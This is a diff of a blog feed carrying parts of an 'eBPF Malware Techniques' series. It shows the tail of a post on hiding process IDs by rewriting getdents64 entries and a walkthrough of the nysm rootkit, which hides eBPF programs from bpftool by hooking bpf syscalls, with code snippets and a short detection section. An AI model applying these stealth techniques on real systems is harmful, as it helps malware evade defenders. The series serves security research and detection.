+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>((<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)(dirent_ptr<span style="color:#f92672">+</span>data.change_me))<span style="color:#f92672">-&gt;</span>d_reclen, <span style="color:#f92672">&amp;</span>data.d_reclen, <span style="color:#66d9ef">sizeof</span>(data.d_reclen));
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Committing Changes to Previous Entry&rsquo;s <em>d_reclen</em><br><br></span>
+<h2 id="5-conclusion">5. Conclusion</h2>
+<p>One of the biggest takeaways here is that even though the logic of hiding a PID is simple, implementing it safely and correctly under eBPF&rsquo;s strict verification rules — especially when dealing with pointer arithmetic and loops — is non-trivial. You must be meticulous about bounds checking, tail calls, and ensuring consistent behavior across invocations.</p>
+<p>You can also check out <a href="https://github.com/pathtofile/bad-bpf/blob/main/src/pidhide.bpf.c"><em>pidhide</em></a>, which is another eBPF application that uses the same technique but implements the logic slightly differently.</p>
+<p>Now that you are armed with dangerous knowledge, it is time to get your hands dirty. Adios!</p>
+<h2 id="6-resources">6. Resources</h2>
+<ol>
+<li><a href="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-4-hiding-processes/resources/simple_ls_cwd.c">simple_ls_cwd.c</a></li>
+</ol>
+]]></content>
+        </item>
         
         <item>
             <title>eBPF Malware Techniques Part 3 - Hiding BPF Traces</title>
@@ -94,7 +325,7 @@ The output is pretty obvious as I do not have other eBPF applications running in
 <li><code>union bpf_attr *attr</code> - This is a pointer to a <code>union bpf_attr</code>, which is a giant union that contains the relevant fields depending on the <code>cmd</code> value.</li>
 <li><code>unsigned int size</code> - This refers to the actual size of <code>union bpf_attr</code></li>
 </ol>
-<h2 id="31-methodology-on-hiding-bpf-traces">3.1 Methodology on Hiding BPF Traces</h2>
+<h2 id="3-methodology-on-hiding-bpf-traces">3 Methodology on Hiding BPF Traces</h2>
 <p>If you have been following along closely so far, you will realize by now that we have 2 possible methods to hide a targeted eBPF program. We can either intercept at <em>BPF_PROG_GET_NEXT_ID</em> or <em>BPF_PROG_GET_FD_BY_ID</em>. The following listings show 2 snippets of how we can possibly hide a targeted <em>prog_id</em> using 2 different methods.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Method 1: Intercept BPF_PROG_GET_NEXT_ID @ tp/syscalls/sys_exit_bpf */</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
@@ -121,10 +352,10 @@ The output is pretty obvious as I do not have other eBPF applications running in
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
 <span class="caption" data-type="listing">Method 2 - Intercept <em>BPF_PROG_GET_FD_BY_ID</em> at <em>sys_enter_bpf</em><br><br></span>
 <p>Of course these 2 methods only hide the eBPF <em>prog_id</em>. This logic can be extended to hide targeted <em>map_id</em>, <em>link_id</em> and <em>btf_id</em> as well.</p>
-<h2 id="32-github-project---eeriedusknysm">3.2 Github Project - eeriedusk/nysm</h2>
+<h2 id="4-github-project---eeriedusknysm">4 Github Project - eeriedusk/nysm</h2>
 <p>Let’s now tie everything together with a real-world example: <em>nysm</em>. This project doesn’t just demonstrate hiding eBPF programs in theory — it actually pulls it off. Using the <em>libbpf</em> framework, <em>nysm</em> manipulates BPF syscalls in stealthy ways to hide its own existence from userland tools like <em>bpftool</em>.</p>
 <p>We’re gonna break down how it works in a step-by-step fashion.</p>
-<h3 id="321-setting-baseline">3.2.1 Setting Baseline</h3>
+<h3 id="41-setting-baseline">4.1 Setting Baseline</h3>
 <p>Before it hides anything, <em>nysm</em> first figures out what’s already on the system. This is important because it needs to distinguish between stuff that was already there, and stuff it’s about to load and should hide.</p>
 <p>This is done in userspace (nysm.c) with a function called <em>bpf_list_object()</em>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bpf_list_object</span>(<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>object_func)(<span style="color:#66d9ef">uint32_t</span>, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span>), <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>id) {
@@ -149,7 +380,7 @@ The output is pretty obvious as I do not have other eBPF applications running in
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
 <span class="caption" data-type="listing">Establishing baseline for <em>prog_ids</em>, <em>map_ids</em> and <em>link_ids</em><br><br></span>
-<h3 id="322-isolating-the-namespace">3.2.2 Isolating the Namespace</h3>
+<h3 id="42-isolating-the-namespace">4.2 Isolating the Namespace</h3>
 <p>To have thorough control over different processes (including itself), nysm achieves this using PID namespaces. It grabs its own namespace inode like stores it as a global variable in the <em>.bss</em> section.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">run_ebpf</span>(<span style="color:#66d9ef">uint32_t</span> pid, <span style="color:#66d9ef">uint32_t</span> ppid) {
 </span></span><span style="display:flex;"><span>    ...
@@ -170,7 +401,7 @@ The output is pretty obvious as I do not have other eBPF applications running in
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
 <span class="caption" data-type="listing">Ignoring Self and Child Processes<br><br></span>
-<h3 id="323-hiding-whats-new">3.2.3 Hiding What&rsquo;s New</h3>
+<h3 id="43-hiding-whats-new">4.3 Hiding What&rsquo;s New</h3>
 <p>Once the baseline is saved and <em>nysm’s</em> own eBPF programs are loaded, it scans the system again. Anything new gets flagged for hiding by calling <em>bpf_hide_diff_object()</em>. This function compares the new list of objects with the old list. If it finds anything new, it updates a map in the kernel to mark it for hiding.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#66d9ef">int</span> map_fd, <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>object_func)(<span style="color:#66d9ef">uint32_t</span>, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span>), <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>id_old) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
@@ -197,7 +428,7 @@ The output is pretty obvious as I do not have other eBPF applications running in
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
 <span class="caption" data-type="listing">Populating Different Object Maps Containing IDs to Hide<br><br></span>
 <p>Now that the maps are populated, it’s time for the fun part.</p>
-<h3 id="324-kernel-space-hooking">3.2.4 Kernel-Space Hooking</h3>
+<h3 id="44-kernel-space-hooking">4.4 Kernel-Space Hooking</h3>
 <p>The main magic happens in <em>get_next_non_listed_id()</em> at the <em>sys_exit_bpf</em> <em>tracepoint</em>. This function iterates through different object maps which previously contained a set of IDs to hide. It will then return a non-listed object ID that is used to overwrite the original value stored in <code>uattr_ptr-&gt;next_id</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_exit_bpf&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_bpf_exit</span>(<span style="color:#66d9ef">void</span>) {
@@ -223,14 +454,14 @@ The output is pretty obvious as I do not have other eBPF applications running in
 </span></span><span style="display:flex;"><span>};
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
 <span class="caption" data-type="listing">Overwriting <em>next_id</em> Value<br><br></span>
-<h3 id="325-demo">3.2.5 Demo</h3>
+<h3 id="45-demo">4.5 Demo</h3>
 <video width=100% controls>
     <source src="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-3-hiding-bpf-traces/videos/nysm-demo.webm" type="video/webm">
     Your browser does not support the video tag.  
 </video>
 <link href="/posts/css/caption.css" rel="stylesheet">
 <span class="caption" data-type="video"><em>nysm</em> Demo<br><br></span>
-<h2 id="4-detection">4. Detection</h2>
+<h2 id="5-detection">5. Detection</h2>
 <p>Even though <em>nysm</em> was very well written, warning messages for <em>bpf_probe_write_user</em> will flood the kernel logs!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo dmesg
 </span></span><span style="display:flex;"><span>...
@@ -239,7 +470,7 @@ The output is pretty obvious as I do not have other eBPF applications running in
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
 <span class="caption" data-type="listing">Kernel Logs Showing Warning Messages on <em>bpf_probe_write_user()</em> Usage<br><br></span>
 <p>Any EDR / SIEM that monitors these logs will definitely flag this out and serve as a pivot point for Blue Teams to do their threat hunting and forensics.</p>
-<h2 id="5-conclusion">5. Conclusion</h2>
+<h2 id="6-conclusion">6. Conclusion</h2>
 <p>By hooking into just a few strategic syscalls and keeping track of what belongs to it, <em>nysm</em> manages to fool userland tools and blend into the kernel like a ghost. This kind of behavior isn’t just useful for malware, but also shows just how powerful (and dangerous) eBPF can be when used creatively.</p>
 <p>However, there are limitations to <em>nysm&rsquo;s</em> capabilities such as the inability to suppress warning messages in the kernel logs.</p>
 <p>In the next part of the series, we will explore on some common techniques used to hide processes. In the meantime, I highly encourage you to look through the <em>nysm</em> repository source code for yourself to deepen your understanding. That&rsquo;s all folks! Till next time&hellip;</p>
